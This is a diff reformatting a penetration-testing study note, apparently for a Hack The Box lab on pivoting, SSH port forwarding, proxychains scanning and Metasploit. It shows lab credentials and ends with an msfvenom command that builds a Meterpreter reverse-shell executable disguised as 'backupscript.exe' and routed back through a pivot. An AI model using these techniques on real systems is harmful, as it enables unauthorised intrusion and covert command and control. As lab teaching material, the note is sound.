@@ -1,7 +1,8 @@
-# 🔄 Pivoting, Tunneling, and Port Forwarding  
-*Once a foothold is secured within the shadowed network, the true journey begins. Pivoting enables passage through the compromised host to unseen realms, while port forwarding and tunneling cloak the traveler’s path in layers of deception, bending the flow of traffic like an eldritch stream.*
+# 🔄 Pivoting, Tunneling, and Port Forwarding
 
-> *“The deeper you delve, the more the paths twist and the darkness thickens.”*
+_Once a foothold is secured within the shadowed network, the true journey begins. Pivoting enables passage through the compromised host to unseen realms, while port forwarding and tunneling cloak the traveler’s path in layers of deception, bending the flow of traffic like an eldritch stream._
+
+> _“The deeper you delve, the more the paths twist and the darkness thickens.”_
 
 ---
 
@@ -16,9 +17,9 @@ In these situations, you must use a pivot host—a previously compromised system
 
 Upon first accessing a host, it is critical to perform immediate reconnaissance. Key checks include:
 
-* **Privilege Level**: What user permissions do you have?
-* **Network Connections**: What other systems is this host communicating with?
-* **VPN & Remote Access Software**: Is the host acting as a gateway to other networks?
+- **Privilege Level**: What user permissions do you have?
+- **Network Connections**: What other systems is this host communicating with?
+- **VPN & Remote Access Software**: Is the host acting as a gateway to other networks?
 
 If a host has multiple network adapters, it is a prime candidate for pivoting to different network segments.
 
@@ -31,17 +32,17 @@ Pivoting is the technique of **using a compromised host to gain access to otherw
 
 A host used for this purpose is often referred to by several names:
 
-* **Pivot Host**
-* **Jump Host**
-* **Proxy**
-* **Foothold**
-* **Beach Head System**
+- **Pivot Host**
+- **Jump Host**
+- **Proxy**
+- **Foothold**
+- **Beach Head System**
 
 Pivoting's primary use is to defeat segmentation (both physically and virtually) to access an isolated network.
 
 **Practical example**
 
-*During one tricky engagement, the target had their network physically and logically separated. This separation made it difficult for us to move around and complete our objectives. We had to search the network and compromise a host that turned out to be the engineering workstation used to maintain and monitor equipment in the operational environment, submit reports, and perform other administrative duties in the enterprise environment. That host turned out to be dual-homed (having more than one physical NIC connected to different networks). Without it having access to both enterprise and operational networks, we would not have been able to pivot as we needed to complete our assessment.*
+_During one tricky engagement, the target had their network physically and logically separated. This separation made it difficult for us to move around and complete our objectives. We had to search the network and compromise a host that turned out to be the engineering workstation used to maintain and monitor equipment in the operational environment, submit reports, and perform other administrative duties in the enterprise environment. That host turned out to be dual-homed (having more than one physical NIC connected to different networks). Without it having access to both enterprise and operational networks, we would not have been able to pivot as we needed to complete our assessment._
 
 </details>
 
@@ -54,16 +55,16 @@ Tunneling is a technique used to **encapsulate network traffic within another pr
 
 This technique is often described using several related terms:
 
-* **Tunneling**
-* **Protocol Tunneling**
-* **Traffic Encapsulation**
-* **Proxying (in certain contexts)**
+- **Tunneling**
+- **Protocol Tunneling**
+- **Traffic Encapsulation**
+- **Proxying (in certain contexts)**
 
 Tunneling's primary use is to enable stealthy pivoting. It defeats network segmentation and monitoring by disguising malicious traffic as legitimate, allowed protocol communications (such as HTTP, DNS, or ICMP), making it difficult for defenders to detect.
 
 **Practical example**
 
-*One way we used Tunneling was to craft our traffic to hide in HTTP and HTTPS. This is a common way we maintained Command and Control (C2) of the hosts we had compromised within a network. We masked our instructions inside GET and POST requests that appeared as normal traffic and, to the untrained eye, would look like a web request or response to any old website. If the packet were formed properly, it would be forwarded to our Control server. If it were not, it would be redirected to another website, potentially throwing off the defender checking it out.*
+_One way we used Tunneling was to craft our traffic to hide in HTTP and HTTPS. This is a common way we maintained Command and Control (C2) of the hosts we had compromised within a network. We masked our instructions inside GET and POST requests that appeared as normal traffic and, to the untrained eye, would look like a web request or response to any old website. If the packet were formed properly, it would be forwarded to our Control server. If it were not, it would be redirected to another website, potentially throwing off the defender checking it out._
 
 </details>
 
@@ -75,15 +76,15 @@ Lateral Movement is the technique adversaries use to **progressively explore, ac
 Common Terminology for Lateral Movement
 This phase of an attack is often described using several related terms:
 
-* **Lateral Movement**
-* **Horizontal Movement**
-* **East-West Movement**
+- **Lateral Movement**
+- **Horizontal Movement**
+- **East-West Movement**
 
 The primary purpose of Lateral Movement is to expand access within a network segment. It is used to find specific targets, access critical domain resources, and escalate privileges across multiple systems to achieve the final objective.
 
 **Practical Example**
 
-*During an assessment, we gained initial access to the target environment and were able to gain control of the local administrator account. We performed a network scan and found three more Windows hosts in the network. We attempted to use the same local administrator credentials, and one of those devices shared the same administrator account. We used the credentials to move laterally to that other device, enabling us to compromise the domain further.*
+_During an assessment, we gained initial access to the target environment and were able to gain control of the local administrator account. We performed a network scan and found three more Windows hosts in the network. We attempted to use the same local administrator credentials, and one of those devices shared the same administrator account. We used the credentials to move laterally to that other device, enabling us to compromise the domain further._
 
 </details>
 
@@ -102,13 +103,13 @@ Being able to grasp the concept of pivoting well enough to succeed at it on an e
 **What is an IP Address?**
 Every computer communicating on a network requires an IP address. Without one, a host is effectively not on the network. This address is a software-assigned identifier, typically obtained in one of two ways:
 
-* **Dynamically**: Automatically assigned by a DHCP server.
+- **Dynamically**: Automatically assigned by a DHCP server.
 
-* **Statically**: Manually configured, which is common for critical network infrastructure and services, such as:
-    * Servers
-    * Routers
-    * Switch Virtual Interfaces
-    * Printers
+- **Statically**: Manually configured, which is common for critical network infrastructure and services, such as:
+  - Servers
+  - Routers
+  - Switch Virtual Interfaces
+  - Printers
 
 **The Role of the Network Interface Controller (NIC)**
 
@@ -174,15 +175,15 @@ Ethernet adapter Ethernet:
 | ---------------------------- | ----------------------: | ---------------------------------: | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | `NordLynx` (Unknown adapter) |                       — |                                  — | Not connected (media disconnected) — likely a WireGuard/WireGuard-based adapter (NordVPN).                                                                                             |
 | `Ethernet0 2`                | IPv4: **10.129.221.36** | Subnet Mask: **255.255.0.0** (/16) | Active interface on HTB lab network (`.htb` DNS suffix). Dual-stack with several IPv6 addresses. Default gateways: IPv6 link-local `fe80::250:56ff:feb9:df81%8` and IPv4 `10.129.0.1`. |
-| `Ethernet`                   |                       — |                                  — | Disconnected physical adapter.         
+| `Ethernet`                   |                       — |                                  — | Disconnected physical adapter.                                                                                                                                                         |
 
 **Key observations & implications**
 
-* The system is on a private IPv4 network (10.129.0.0/16). This is an RFC1918 address space and is reachable only inside the lab network or via VPN/tunnel, not directly from the public Internet.
-* The host uses dual-stack: it has both IPv4 and IPv6 addresses. Services or hosts may be reachable over either protocol; testing should consider both when possible.
-* The NordLynx adapter is present but disconnected — if it becomes active it may provide an alternative VPN route (different lab or Internet VPN).
-* The subnet mask (255.255.0.0) indicates the host shares the 10.129.0.0/16 network with any 10.129.x.x addresses; traffic to other subnets will be sent to the default gateway (10.129.0.1).
-* For pivoting or lateral movement: the networks visible from this host are limited to the subnets reachable via its assigned interfaces (and whatever routes the gateway provides). Documenting the IPs, masks and gateway is essential to know what this host can reach.                                                                                                                                                |
+- The system is on a private IPv4 network (10.129.0.0/16). This is an RFC1918 address space and is reachable only inside the lab network or via VPN/tunnel, not directly from the public Internet.
+- The host uses dual-stack: it has both IPv4 and IPv6 addresses. Services or hosts may be reachable over either protocol; testing should consider both when possible.
+- The NordLynx adapter is present but disconnected — if it becomes active it may provide an alternative VPN route (different lab or Internet VPN).
+- The subnet mask (255.255.0.0) indicates the host shares the 10.129.0.0/16 network with any 10.129.x.x addresses; traffic to other subnets will be sent to the default gateway (10.129.0.1).
+- For pivoting or lateral movement: the networks visible from this host are limited to the subnets reachable via its assigned interfaces (and whatever routes the gateway provides). Documenting the IPs, masks and gateway is essential to know what this host can reach. |
 
 </details>
 
@@ -197,7 +198,7 @@ Ethernet adapter Ethernet:
 <td>
 
 ```bash
-ifconfig 
+ifconfig
 ```
 
 ---
@@ -247,20 +248,20 @@ tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
 
 **Network interfaces (summary)**
 
-| Interface |                                  Address(es) |    Netmask / Prefix | Role / Notes                                     |
-| --------- | -------------------------------------------: | ------------------: | ------------------------------------------------ |
-| `eth0`    |                              134.122.100.200 | 255.255.240.0 (/20) | Public IP — host reachable via Internet / DMZ    |
-| `eth1`    |                                 10.106.0.172 | 255.255.240.0 (/20) | Private/internal network                         |
-| `lo`      |                                    127.0.0.1 |           255.0.0.0 | Local loopback                                   |
+| Interface |                                  Address(es) |    Netmask / Prefix | Role / Notes                                                   |
+| --------- | -------------------------------------------: | ------------------: | -------------------------------------------------------------- |
+| `eth0`    |                              134.122.100.200 | 255.255.240.0 (/20) | Public IP — host reachable via Internet / DMZ                  |
+| `eth1`    |                                 10.106.0.172 | 255.255.240.0 (/20) | Private/internal network                                       |
+| `lo`      |                                    127.0.0.1 |           255.0.0.0 | Local loopback                                                 |
 | `tun0`    | 10.10.15.54 (IPv4), dead:beef:2::1034 (IPv6) | 255.255.254.0 (/23) | VPN tunnel interface — indicates an active OpenVPN/HTB tunnel. |
 
 **Key observations & implications**
 
-* The presence of `tun0` confirms an active VPN connection. HTB lab access is provided over such a tunnel: without it, lab networks are unreachable.
-* `eth0` has a public IP (routable on the Internet). Public-facing interfaces are typically in DMZs and can be reached from outside, subject to firewall rules.
-* `eth1` uses a private address (RFC1918) and is routable only inside the local/internal network. Private addresses are not directly reachable from the Internet.
-* NAT is typically used at the network edge to translate between private addresses and a public IP on the appliance that connects to the Internet. Devices without a public IP rely on NAT to communicate externally.
-* VPNs encrypt traffic and create a logical tunnel over the public network; this enables access to internal lab resources while protecting traffic in transit.
+- The presence of `tun0` confirms an active VPN connection. HTB lab access is provided over such a tunnel: without it, lab networks are unreachable.
+- `eth0` has a public IP (routable on the Internet). Public-facing interfaces are typically in DMZs and can be reached from outside, subject to firewall rules.
+- `eth1` uses a private address (RFC1918) and is routable only inside the local/internal network. Private addresses are not directly reachable from the Internet.
+- NAT is typically used at the network edge to translate between private addresses and a public IP on the appliance that connects to the Internet. Devices without a public IP rely on NAT to communicate externally.
+- VPNs encrypt traffic and create a logical tunnel over the public network; this enables access to internal lab resources while protecting traffic in transit.
 
 </details>
 
@@ -270,7 +271,6 @@ tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
 <summary><h2>Routing</h2></summary>
 
 Routing is the process of forwarding packets based on their destination IP. Although people often picture a specialised “router” appliance, **any host can act as a router** if it forwards traffic between interfaces. In pentesting and pivoting you’ll often need a host (pivot) to route traffic into otherwise unreachable networks. Tools like AutoRoute automate adding routes on your attack box so traffic destined for target subnets is forwarded via a pivot host.
-
 
 <table width="100%">
 <tr>
@@ -302,11 +302,11 @@ default         178.62.64.1     0.0.0.0         UG        0 0          0 eth0
 
 **Routing table fields**
 
-* **Destination** — network (or default) the route matches.
-* **Gateway** — next-hop IP to which packets are forwarded.
-* **Genmask** — subnet mask (defines the network size).
-* **Flags** — route attributes (e.g. U = up, G = uses gateway).
-* **Iface** — interface used to send packets (e.g. eth0, tun0).
+- **Destination** — network (or default) the route matches.
+- **Gateway** — next-hop IP to which packets are forwarded.
+- **Genmask** — subnet mask (defines the network size).
+- **Flags** — route attributes (e.g. U = up, G = uses gateway).
+- **Iface** — interface used to send packets (e.g. eth0, tun0).
 
 **How the system decides where to send a packet**
 
@@ -314,28 +314,27 @@ default         178.62.64.1     0.0.0.0         UG        0 0          0 eth0
 2. If a specific route matches, the OS forwards the packet to the route’s Gateway via the listed Iface.
 3. If no specific route matches, the packet is sent to the default route (aka default gateway / gateway of last resort).
 4. Routes can be learned from:
-        * Directly connected interfaces (automatic when an interface is up and has an IP),
-        * Static routes configured by an admin,
-        * Dynamic routing protocols (OSPF, BGP, etc.) on dedicated routers.
+   _ Directly connected interfaces (automatic when an interface is up and has an IP),
+   _ Static routes configured by an admin, \* Dynamic routing protocols (OSPF, BGP, etc.) on dedicated routers.
 
 **Pivoting and AutoRoute — practical notes**
 
-* **Pivoting**: to reach a target network from your attack box, the attack box must have a route that forwards traffic to the pivot host which can reach that network.
-* **AutoRoute**: common in labs — it installs routes on your attack machine so traffic destined for lab subnets is routed via the pivot automatically.
-* **Inspection**: always inspect the host’s routing table to discover which networks are reachable and which additional routes are required for pivoting.
+- **Pivoting**: to reach a target network from your attack box, the attack box must have a route that forwards traffic to the pivot host which can reach that network.
+- **AutoRoute**: common in labs — it installs routes on your attack machine so traffic destined for lab subnets is routed via the pivot automatically.
+- **Inspection**: always inspect the host’s routing table to discover which networks are reachable and which additional routes are required for pivoting.
 
 **When to inspect routes during an engagement**
 
-* After gaining code execution on a host (to know what networks that host can reach).
-* Before attempting port scans or service connections through a pivot.
-* When AutoRoute or proxying fails — confirm the required route exists and points at the pivot.
+- After gaining code execution on a host (to know what networks that host can reach).
+- Before attempting port scans or service connections through a pivot.
+- When AutoRoute or proxying fails — confirm the required route exists and points at the pivot.
 
 Short checklist for pivoting
 
- * *Check routing table on the pivot and on your attack box.*
- * *Confirm the pivot can reach the target network (ping/traceroute from pivot).*
- * *Add a route on your attack box that points to the pivot as next-hop for the target subnet.*
- * *Verify traffic flows (tcpdump / packet captures on pivot or your box).*
+- _Check routing table on the pivot and on your attack box._
+- _Confirm the pivot can reach the target network (ping/traceroute from pivot)._
+- _Add a route on your attack box that points to the pivot as next-hop for the target subnet._
+- _Verify traffic flows (tcpdump / packet captures on pivot or your box)._
 
 </details>
 
@@ -344,20 +343,20 @@ Short checklist for pivoting
 
 What they are
 
-* **Protocols** — rules that govern how devices communicate over a network (e.g., HTTP, FTP, SSH).
-* **Services** — applications that implement protocols (e.g., a web server provides HTTP).
-* **Ports** — logical identifiers (numbers) assigned in software to services. Ports are not physical; they let us address an application on a host.
+- **Protocols** — rules that govern how devices communicate over a network (e.g., HTTP, FTP, SSH).
+- **Services** — applications that implement protocols (e.g., a web server provides HTTP).
+- **Ports** — logical identifiers (numbers) assigned in software to services. Ports are not physical; they let us address an application on a host.
 
 How they relate
 
-* An **IP address** identifies a host on the network.
-* An **open port** on that IP identifies a specific application/service we can connect to.
-* **Firewalls and network policies** often permit traffic on certain ports (e.g., port 80 for HTTP). Attackers can sometimes abuse those allowed ports to gain a foothold.
+- An **IP address** identifies a host on the network.
+- An **open port** on that IP identifies a specific application/service we can connect to.
+- **Firewalls and network policies** often permit traffic on certain ports (e.g., port 80 for HTTP). Attackers can sometimes abuse those allowed ports to gain a foothold.
 
 Client vs server ports
 
-* The **server** listens on a well-known port (e.g., HTTP → port 80).
-* The **client** uses an ephemeral source port to track the connection. Both sides’ ports matter when establishing and maintaining communications.
+- The **server** listens on a well-known port (e.g., HTTP → port 80).
+- The **client** uses an ephemeral source port to track the connection. Both sides’ ports matter when establishing and maintaining communications.
 
 </details>
 
@@ -381,6 +380,7 @@ We have our attack host (10.10.15.x) and a target Ubuntu server (10.129.x.x), wh
 ```bash
 nmap -sT -p22,3306 10.129.202.64
 ```
+
 ```bash
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
 Nmap scan report for 10.129.202.64
@@ -395,21 +395,19 @@ Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
 
 Nmap shows the SSH port on the target is open. MySQL is running on the Ubuntu server and listening on localhost:3306, so it is not directly reachable from your machine. There are two practical options:
 
-**Option A** — SSH in and use MySQL locally (direct, interactive)
-        1. ssh to the target
-        2. Connect with the mysql client on the server
+**Option A** — SSH in and use MySQL locally (direct, interactive) 1. ssh to the target 2. Connect with the mysql client on the server
 
-* *When to use:* quick inspection, admin tasks, or when you can run your tooling on the server itself.
-* *Pros:* no port forwarding needed; uses native network context.
-* *Cons:* some exploit tools or GUI clients run only from your local machine, or require a local TCP connection.
+- _When to use:_ quick inspection, admin tasks, or when you can run your tooling on the server itself.
+- _Pros:_ no port forwarding needed; uses native network context.
+- _Cons:_ some exploit tools or GUI clients run only from your local machine, or require a local TCP connection.
 
 **Option B** — Port-forward MySQL to your localhost (recommended for local tooling)
 
 Why this helps:
 
-* MySQL is hosted locally on the Ubuntu server at 3306 (bound to 127.0.0.1), so it is unreachable directly from your host.
-* Port forwarding exposes that local socket on your machine (:1234), letting local tools (exploit frameworks, GUI clients, scripts) connect as if the DB were local.
-* Many remote exploit workflows require a direct TCP connection to the service — port forwarding makes that possible without changing the server configuration.
+- MySQL is hosted locally on the Ubuntu server at 3306 (bound to 127.0.0.1), so it is unreachable directly from your host.
+- Port forwarding exposes that local socket on your machine (:1234), letting local tools (exploit frameworks, GUI clients, scripts) connect as if the DB were local.
+- Many remote exploit workflows require a direct TCP connection to the service — port forwarding makes that possible without changing the server configuration.
 
 </details>
 
@@ -419,8 +417,9 @@ Why this helps:
 ```bash
 ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
 ```
+
 ```bash
-ubuntu@10.129.202.64's password: 
+ubuntu@10.129.202.64's password:
 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -467,11 +466,12 @@ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
 ```bash
 netstat -antp | grep 1234
 ```
+
 ```bash
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
-tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh            
-tcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh  
+tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh
+tcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh
 ```
 
 **Nmap**
@@ -479,6 +479,7 @@ tcp6       0      0 ::1:1234                :::*                    LISTEN      
 ```bash
 nmap -v -sV -p1234 localhost
 ```
+
 ```bash
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:18 EST
 NSE: Loaded 45 scripts for scanning.
@@ -516,13 +517,14 @@ Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
 
 If we type `ifconfig` on the Ubuntu host, you will find that this server has multiple NICs:
 
-* One connected to our attack host (*ens192*)
-* One communicating to other hosts within a different network (*ens224*)
-* The loopback interface (*lo*).
+- One connected to our attack host (_ens192_)
+- One communicating to other hosts within a different network (_ens224_)
+- The loopback interface (_lo_).
 
 ```bash
-ifconfig 
+ifconfig
 ```
+
 ```bash
 ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255
@@ -575,24 +577,24 @@ flowchart LR
     NM["<b>Nmap</b>"]
     SSHC["<b>SSH Client</b>"]
     SOCK["<b>SOCKS Listener</b><br/>on port <b>9050</b>"]
-    
+
     NM -.->|Start<br/>Nmap| PC
     PC -->|Send<br/>Packets| NM
     PC -.->|Forwards<br/>Packets| SSHC
     SSHC <-->|↕| SOCK
   end
-  
+
   %% Subgraph Victim Server
   subgraph VIC["<b>Victim Server (Ubuntu)</b><br/>10.129.15.50<br/>172.16.5.129"]
     direction TB
     SSHV["<b>SSH: 0.0.0.0:22</b>"]
     CORP["🏢<br/><b>Internal Hosts</b><br/>172.16.5.0/23"]
   end
-  
+
   %% Main connection
   SOCK <==>|"<b>Forward Nmap packets<br/>from port 9050 via SSH</b>"| SSHV
   SSHV -->|"<b>Nmap<br/>scan<br/>actions</b>"| CORP
-  
+
   %% Styling
   style ATT fill:#1a2332,stroke:#9ACD32,stroke-width:3px,color:#fff
   style VIC fill:#1a2332,stroke:#9ACD32,stroke-width:3px,color:#fff
@@ -602,7 +604,7 @@ flowchart LR
   style SOCK fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
   style SSHV fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
   style CORP fill:#3d5a40,stroke:#9ACD32,stroke-width:2px,color:#fff
-  
+
   linkStyle 4 stroke:#ff6b6b,stroke-width:4px,stroke-dasharray:5
   linkStyle 5 stroke:#ff6b6b,stroke-width:3px
 ```
@@ -628,6 +630,7 @@ To inform proxychains that we must use port 9050, we must modify the proxychains
 ```bash
 tail -4 /etc/proxychains.conf
 ```
+
 ```bash
 # meanwile
 # defaults set to "tor"
@@ -644,6 +647,7 @@ Now we want to run nmap through that SOCKS proxy using proxychains so scans orig
 ```bash
 proxychains nmap -v -sn 172.16.5.1-200
 ```
+
 ```bash
 ProxyChains-3.1 (http://proxychains.sf.net)
 
@@ -657,22 +661,26 @@ RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
 ...
 ```
 
-* `proxychains` intercepts nmap’s TCP connections and routes them through the SOCKS proxy at `127.0.0.1:9050`.
-* That SOCKS proxy forwards the connections over the SSH tunnel to the pivot host, which then performs the network actions from inside the target network.
-* From the target network’s perspective, traffic appears to come from the pivot host IP.
+- `proxychains` intercepts nmap’s TCP connections and routes them through the SOCKS proxy at `127.0.0.1:9050`.
+- That SOCKS proxy forwards the connections over the SSH tunnel to the pivot host, which then performs the network actions from inside the target network.
+- From the target network’s perspective, traffic appears to come from the pivot host IP.
 
-*Only full TCP connect scans (`-sT`) and connect-style operations are reliable.*
-* proxychains proxies raw TCP streams — it cannot handle partial/raw packets.
-* Low-level scans that require raw sockets (e.g., SYN scan `-sS`, many raw ping techniques) will not work correctly through proxychains and will produce false or inconsistent results.
+_Only full TCP connect scans (`-sT`) and connect-style operations are reliable._
 
-*Host-alive (ping) checks may fail for Windows targets.*
-* Windows Defender / host firewalls commonly block ICMP echo requests; a ping scan (`-sn`) may show hosts as down even though TCP ports are open.
+- proxychains proxies raw TCP streams — it cannot handle partial/raw packets.
+- Low-level scans that require raw sockets (e.g., SYN scan `-sS`, many raw ping techniques) will not work correctly through proxychains and will produce false or inconsistent results.
 
-*Performance will be slower and higher-latency.*
-* All traffic is proxied and serialized through the SSH tunnel, which increases RTT and may affect timing-sensitive scans. Expect longer run times.
+_Host-alive (ping) checks may fail for Windows targets._
 
-*UDP scanning is unreliable (or impossible) over SOCKS in many tools.*
-* SOCKS5 supports UDP, but most scanning tools don’t implement UDP-over-SOCKS well. Run UDP scans on the pivot host itself if needed.
+- Windows Defender / host firewalls commonly block ICMP echo requests; a ping scan (`-sn`) may show hosts as down even though TCP ports are open.
+
+_Performance will be slower and higher-latency._
+
+- All traffic is proxied and serialized through the SSH tunnel, which increases RTT and may affect timing-sensitive scans. Expect longer run times.
+
+_UDP scanning is unreliable (or impossible) over SOCKS in many tools._
+
+- SOCKS5 supports UDP, but most scanning tools don’t implement UDP-over-SOCKS well. Run UDP scans on the pivot host itself if needed.
 
 </details>
 
@@ -684,6 +692,7 @@ So, for this module, we will primarily focus on scanning individual hosts, or sm
 ```bash
 proxychains nmap -v -Pn -sT 172.16.5.19
 ```
+
 ```bash
 ProxyChains-3.1 (http://proxychains.sf.net)
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
@@ -734,6 +743,7 @@ We can also open Metasploit using proxychains and send all associated traffic th
 ```bash
 proxychains msfconsole
 ```
+
 ```bash
 ProxyChains-3.1 (http://proxychains.sf.net)
 ...
@@ -744,10 +754,10 @@ Press SPACE BAR to continue
 + -- --=[ 596 payloads - 45 encoders - 10 nops            ]
 + -- --=[ 9 evasion                                       ]
 
-Metasploit tip: Adapter names can be used for IP params 
+Metasploit tip: Adapter names can be used for IP params
 set LHOST eth0
 
-msf6 > 
+msf6 >
 ```
 
 **Using rdp_scanner Module**
@@ -755,6 +765,7 @@ msf6 >
 ```bash
 msf6 > search rdp_scanner
 ```
+
 ```bash
 Matching Modules
 ================
@@ -763,9 +774,11 @@ Matching Modules
    -  ----                               ---------------  ----    -----  -----------
    0  auxiliary/scanner/rdp/rdp_scanner                   normal  No     Identify endpoints speaking the Remote Desktop Protocol (RDP)
 ```
+
 ```bash
 msf6 > search rdp_scanner
 ```
+
 ```bash
 Matching Modules
 ================
@@ -774,11 +787,13 @@ Matching Modules
    -  ----                               ---------------  ----    -----  -----------
    0  auxiliary/scanner/rdp/rdp_scanner                   normal  No     Identify endpoints speaking the Remote Desktop Protocol (RDP)
 ```
+
 ```bash
 msf6 > use 0
 msf6 auxiliary(scanner/rdp/rdp_scanner) > set rhosts 172.16.5.19
 msf6 auxiliary(scanner/rdp/rdp_scanner) > run
 ```
+
 ```bash
 |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
 |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
@@ -798,6 +813,7 @@ Depending on the level of access we have to this host during an assessment, we m
 ```bash
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
+
 ```bash
 ProxyChains-3.1 (http://proxychains.sf.net)
 [13:02:42:481] [4829:4830] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
@@ -818,10 +834,11 @@ The `xfreerdp` command will require an RDP certificate to be accepted before suc
 <summary><h2>🔄 Remote/Reverse Port Forwarding with SSH</h2></summary>
 
 We’ve already covered:
-* **Local port forwarding (`-L`)** — SSH listens on a port on your machine and forwards connections to a service reachable from the remote host. This is used to *bring a remote service to your local host*.
-* **Dynamic port forwarding (`-D`)** — SSH creates a local SOCKS proxy so you can route arbitrary connections through a pivot host and reach networks that your attack machine has no direct route to.
-Now, we will cover:
-* **Remote forwarding (`-R`)** — remote port → local service (expose local to remote).
+
+- **Local port forwarding (`-L`)** — SSH listens on a port on your machine and forwards connections to a service reachable from the remote host. This is used to _bring a remote service to your local host_.
+- **Dynamic port forwarding (`-D`)** — SSH creates a local SOCKS proxy so you can route arbitrary connections through a pivot host and reach networks that your attack machine has no direct route to.
+  Now, we will cover:
+- **Remote forwarding (`-R`)** — remote port → local service (expose local to remote).
 
 Sometimes you need to expose a service running on your local machine to the remote network. This is the inverse of local forwarding: you make the remote (pivot) host listen on a port and forward incoming connections back to a service on your machine.
 
@@ -829,25 +846,25 @@ Sometimes you need to expose a service running on your local machine to the remo
 flowchart LR
   %% Nodes principales
   ATT["<b>Attack Host</b><br/><br/>10.10.15.5<br/><br/>💻<br/><br/>"]
-  
+
   VIC1["<b>Victim Server (Ubuntu)</b><br/><br/>10.129.15.50<br/>172.16.5.129<br/><br/>🗄️"]
-  
+
   QUESTION["<br/>❓<br/><br/><b>No route to<br/>attack host</b><br/><br/>"]
-  
+
   VIC2["<b>Victim Server (Windows A)</b><br/><br/>172.16.5.19<br/><br/><b>RDP Service</b><br/><br/>🗄️"]
-  
+
   %% Connections
   ATT ==>|"<b>SSH: 0.0.0.0:22</b>"| VIC1
   VIC1 ==>|" "| QUESTION
   QUESTION ==>|" "| VIC2
   VIC2 -.->|" "| ATT
-  
+
   %% Styling
   style ATT fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
   style VIC1 fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
   style VIC2 fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
   style QUESTION fill:#2d3e50,stroke:#ff6b6b,stroke-width:3px,color:#fff
-  
+
   linkStyle 0 stroke:#ff6b6b,stroke-width:4px,stroke-dasharray:5
   linkStyle 1 stroke:#ff6b6b,stroke-width:4px,stroke-dasharray:5
   linkStyle 2 stroke:#9ACD32,stroke-width:4px,stroke-dasharray:5
@@ -864,29 +881,30 @@ You try to get a reverse shell from Windows A (172.16.5.19) back to your attack 
 
 **Why RDP alone may be insufficient**
 
-* RDP gives interactive access but can be limited (clipboard/file transfer disabled, restricted built-in tools).
-* Tasks that need deeper interaction or privileged tooling (file upload/download, process injection, API calls, Meterpreter features) often require a proper reverse shell or agent.
-* Without network routing between Windows A and your attack host, a reverse shell cannot be established directly.
+- RDP gives interactive access but can be limited (clipboard/file transfer disabled, restricted built-in tools).
+- Tasks that need deeper interaction or privileged tooling (file upload/download, process injection, API calls, Meterpreter features) often require a proper reverse shell or agent.
+- Without network routing between Windows A and your attack host, a reverse shell cannot be established directly.
 
 **Pivot concept (high-level solution)**
 
 Use a pivot host that has connectivity to both networks. In this scenario the Ubuntu server is that pivot: it can reach both the Windows target (172.16.5.19) and the network where your attack host/listener is reachable.
-* Configure the payload on Windows so its reverse connection targets the pivot host IP (the pivot acts as the rendezvous point).
-* On the pivot host, forward a remote port to your attack host’s listener so that reverse traffic arriving at the pivot is relayed to your Metasploit listener.
+
+- Configure the payload on Windows so its reverse connection targets the pivot host IP (the pivot acts as the rendezvous point).
+- On the pivot host, forward a remote port to your attack host’s listener so that reverse traffic arriving at the pivot is relayed to your Metasploit listener.
 
 **Concrete example**
 
-1. Windows A outbound is restricted to 172.16.5.0/23.  
-2. Pivot host IP on that internal net: `172.16.5.129` (Ubuntu).  
-3. Configure the Meterpreter HTTPS payload to connect to **LHOST** = `172.16.5.129`.  
-4. On the pivot, forward port 8080 to your attack host’s Metasploit listener on port `8000`.  
-    * **Result:** Windows A connects to 172.16.5.129:8080 → pivot forwards to your attack host `:8000` → Metasploit accepts the session.
+1. Windows A outbound is restricted to 172.16.5.0/23.
+2. Pivot host IP on that internal net: `172.16.5.129` (Ubuntu).
+3. Configure the Meterpreter HTTPS payload to connect to **LHOST** = `172.16.5.129`.
+4. On the pivot, forward port 8080 to your attack host’s Metasploit listener on port `8000`.
+   - **Result:** Windows A connects to 172.16.5.129:8080 → pivot forwards to your attack host `:8000` → Metasploit accepts the session.
 
 **When to use this approach**
 
-* Reverse shells must traverse disjoint networks with no direct route.  
-* RDP is insufficient for the actions you need (file transfer, API-level enumeration, payload execution).  
-* You have a compromised/accessible host that can act as a reliable pivot between networks.
+- Reverse shells must traverse disjoint networks with no direct route.
+- RDP is insufficient for the actions you need (file transfer, API-level enumeration, payload execution).
+- You have a compromised/accessible host that can act as a reliable pivot between networks.
 
 </details>
 
@@ -898,6 +916,7 @@ Use a pivot host that has connectivity to both networks. In this scenario the Ub
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
 ```
+
 ```bash
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
